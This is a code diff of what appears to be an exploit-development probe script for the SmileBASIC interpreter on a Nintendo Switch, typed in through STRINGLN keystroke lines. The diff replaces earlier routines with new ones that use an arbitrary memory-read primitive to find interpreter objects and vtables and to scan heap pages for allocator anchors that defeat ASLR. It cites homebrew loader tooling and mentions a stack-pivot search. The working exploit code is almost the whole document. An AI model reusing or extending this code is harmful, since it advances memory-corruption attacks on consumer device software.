@@ -11,7 +11,7 @@ STRINGLN '   V=S6DIST()        pointer distribution in the heap (sets PT6# for S
 STRINGLN ' NOTE: error branches use the proven v21 idiom only:
 STRINGLN '       X$=PLOG(...):SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
 STRINGLN VAR NSR,V$,D$,S$,A$,X$,OD$,OD2$,ZERO$,CAP$,I,J,R
-STRINGLN VAR PHASE=0,B#,C#,T#,E0#,E2#,E3#,KH#,SH#,DGP#,K#,CNT#,PG#,SCAN#,M#,MM#,D#,G#,S2#,PT6#
+STRINGLN VAR PHASE=0,OFFA#,B#,C#,T#,E0#,E2#,E3#,KH#,SH#,DGP#,K#,CNT#,PG#,SCAN#,M#,MM#,D#,G#,S2#,PT6#
 STRINGLN DIM MDATA#[8]
 STRINGLN ZERO$=CHR$(0)
 STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
@@ -563,58 +563,100 @@ STRINGLN X$=PLOG("S12 PIVOT NONE - no mov sp,xN ; ret exists in .text")
 STRINGLN IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$
 STRINGLN RETURN 1
 STRINGLN END
-STRINGLN COMMON DEF S21TAB()
-STRINGLN VAR D$,J,V#,N,K#
-STRINGLN ' PORT_STATUS.md records: "Variable-table copy of the pointer table at window
-STRINGLN ' offset +624 bytes". 624 = 0x270. That is a copy of the slot pointer table,
-STRINGLN ' i.e. the interpreter's own slot array - the thing the 4.4.9 bootstrap walks.
-STRINGLN ' Anchor hypothesis: M# is reachable from that table's pointers.
-STRINGLN X$=PLOG("== S21 ==")
+STRINGLN COMMON DEF S25OBJ()
+STRINGLN VAR D$,J,V#,O#
+STRINGLN ' pepsipu's blog: "the 8 bytes preceding any array in SmileBASIC contain a
+STRINGLN ' pointer to the array itself." That pointer O is the INTERPRETER OBJECT that
+STRINGLN ' owns the array. E0# is the backing; O = *(E0# - 8). O is a C++ object with
+STRINGLN ' a vtable in the module -> M#.
+STRINGLN X$=PLOG("== S25 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
-STRINGLN D$=RD(E0#+624,2048)
-STRINGLN IF LEN(D$)<2048 THEN X$=PLOG("S21 SHORT "+STR$(LEN(D$))):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
-STRINGLN X$=PLOG("S21 TABLE "+DUMPH$(LEFT$(D$,64)))
-STRINGLN N=0
-STRINGLN FOR J=0 TO 2044 STEP 4
-STRINGLN V#=U#(MID$(D$,J,4))
-STRINGLN IF PTR(V#,16) THEN
-STRINGLN N=N+1
-STRINGLN IF N<=32 THEN X$=PLOG("S21 P"+STR$(J)+" "+HX$(V#)+" D "+HX$(V#-E0#))
-STRINGLN ENDIF
+STRINGLN IF E0#<16 THEN X$=PLOG("S25 LOW") :IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
+STRINGLN D$=RD(E0#-16,16)
+STRINGLN IF LEN(D$)<16 THEN X$=PLOG("S25 SHORT "+STR$(LEN(D$))):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
+STRINGLN X$=PLOG("S25 PRE HEX "+DUMPH$(D$))
+STRINGLN O#=U#(MID$(D$,8,4))
+STRINGLN X$=PLOG("S25 O "+HX$(O#)+" D "+HX$(O#-E0#))
+STRINGLN IF PTR(O#,16) THEN
+STRINGLN D$=RD(O#,64)
+STRINGLN IF LEN(D$)>=64 THEN
+STRINGLN X$=PLOG("S25 AT "+HX$(O#))
+STRINGLN FOR J=0 TO 60 STEP 4
+STRINGLN X$=PLOG("  "+STR$(J/4)+" "+HX$(U#(MID$(D$,J,4))))
 STRINGLN NEXT
-STRINGLN X$=PLOG("S21 PTCOUNT "+STR$(N))
+STRINGLN ELSE
+STRINGLN X$=PLOG("S25 O SHORT "+STR$(LEN(D$)))
+STRINGLN ENDIF
+STRINGLN ELSE
+STRINGLN X$=PLOG("S25 O BAD")
+STRINGLN ENDIF
 STRINGLN IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$
 STRINGLN RETURN 1
 STRINGLN END
-STRINGLN COMMON DEF S20PAIR()
-STRINGLN VAR D$,J,V#,L#,PG#,PAGE#,BASE#,HIT#,N
-STRINGLN ' Test the 0x58 pair invariant ON CONSOLE instead of dumping raw bytes.
-STRINGLN ' ounceloader ro_layout.py: two adjacent u64 where second-first == 0x58 is
-STRINGLN ' the ASLR-surviving heap anchor; root = first - 0x28e0. Constants are
-STRINGLN ' Switch 2, so we report the measured pairs and derive the offsets offline.
+STRINGLN COMMON DEF S26OBJ()
+STRINGLN VAR D$,J,V#,O#
+STRINGLN ' Correct object-pointer location per the author's mechanism:
+STRINGLN ' descriptor.ptr (E0#+0x20) points to data at +0x10 = E0#+0x30
+STRINGLN ' the 8 bytes BEFORE that data = E0#+0x28 = the array's object pointer O.
+STRINGLN ' O is the interpreter object with a vtable in the module.
+STRINGLN X$=PLOG("== S26 ==")
+STRINGLN X$=PLOG("W0 "+HX$(E0#))
+STRINGLN D$=RD(E0#+0x28,16)
+STRINGLN IF LEN(D$)<16 THEN X$=PLOG("S26 SHORT "+STR$(LEN(D$))):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
+STRINGLN X$=PLOG("S26 HEX "+DUMPH$(D$))
+STRINGLN O#=U#(MID$(D$,0,4))
+STRINGLN X$=PLOG("S26 O "+HX$(O#)+" D "+HX$(O#-E0#))
+STRINGLN IF PTR(O#,16) THEN
+STRINGLN D$=RD(O#,64)
+STRINGLN IF LEN(D$)>=64 THEN
+STRINGLN X$=PLOG("S26 AT "+HX$(O#))
+STRINGLN FOR J=0 TO 60 STEP 4
+STRINGLN X$=PLOG("  "+STR$(J/4)+" "+HX$(U#(MID$(D$,J,4))))
+STRINGLN NEXT
+STRINGLN ELSE
+STRINGLN X$=PLOG("S26 O SHORT "+STR$(LEN(D$)))
+STRINGLN ENDIF
+STRINGLN ELSE
+STRINGLN X$=PLOG("S26 O BAD")
+STRINGLN ENDIF
+STRINGLN IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$
+STRINGLN RETURN 1
+STRINGLN END
+STRINGLN COMMON DEF S24LINK()
+STRINGLN VAR D$,J,V#,PG#,PAGE#,BASE#,HIT#,N,ZT#
+STRINGLN ' Real allocator-anchor predicate, from ounceloader metadata.py links_from():
+STRINGLN '   at 0x4000 stride, find a u64 that is
+STRINGLN '     > 2^32  and  < 2^39          (module/heap band: 4GB..512GB)
+STRINGLN '     % 0x4000 == 0               (page aligned)
+STRINGLN '     abs(value - seed) < 0x2000000
+STRINGLN '     next 56 bytes all zero      (zeroTail)
+STRINGLN ' Our earlier 0x58-pair and [16MB,1GB) band tests used the WRONG predicate.
 STRINGLN BASE#=FLOOR(E0#/4096)*4096
 STRINGLN HIT#=0
 STRINGLN N=0
-STRINGLN X$=PLOG("== S20 ==")
+STRINGLN X$=PLOG("== S24 ==")
 STRINGLN X$=PLOG("W0 "+HX$(E0#))
-STRINGLN FOR PG#=0 TO 63
+STRINGLN FOR PG#=0 TO 255
 STRINGLN PAGE#=BASE#+PG#*4096
 STRINGLN D$=RD(PAGE#,2048)
-STRINGLN IF LEN(D$)<2048 THEN X$=PLOG("S20PG "+STR$(PG#)+" SHORT"):GOTO @S20OUT
-STRINGLN FOR J=0 TO 2032 STEP 8
-STRINGLN V#=U#(MID$(D$,J,4))
-STRINGLN L#=U#(MID$(D$,J+4,4))
-STRINGLN IF L#-V#==88 && PTR(V#,4096) THEN
+STRINGLN IF LEN(D$)<2048 THEN X$=PLOG("S24PG "+STR$(PG#)+" SHORT"):GOTO @S24OUT
+STRINGLN ' test only every 0x4000 (2 chars... no: 0x4000 bytes = 0x2000 chars); we read
+STRINGLN ' one page at a time so each page start IS the aligned slot.
+STRINGLN V#=U#(MID$(D$,0,4))
+STRINGLN ZT#=1
+STRINGLN FOR J=4 TO 60 STEP 4
+STRINGLN IF U#(MID$(D$,J,4))!=0 THEN ZT#=0
+STRINGLN NEXT
+STRINGLN IF V#>=481036337152 && V#<494780232499 && V#==FLOOR(V#/4096)*4096 && ZT#==1 THEN
 STRINGLN HIT#=HIT#+1
-STRINGLN IF N<30 THEN
+STRINGLN IF N<24 THEN
 STRINGLN N=N+1
-STRINGLN X$=PLOG("P58 "+HX$(PAGE#+J*2)+" A "+HX$(V#)+" B "+HX$(L#)+" ROOT "+HX$(V#-10464))
+STRINGLN X$=PLOG("LNK "+HX$(PAGE#)+" V "+HX$(V#)+" DELTA "+HX$(V#-E0#))
 STRINGLN ENDIF
 STRINGLN ENDIF
 STRINGLN NEXT
-STRINGLN NEXT
-STRINGLN @S20OUT
-STRINGLN X$=PLOG("S20 PAIRS "+STR$(HIT#))
+STRINGLN @S24OUT
+STRINGLN X$=PLOG("S24 LINKS "+STR$(HIT#))
 STRINGLN IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$
 STRINGLN RETURN 1
 STRINGLN END
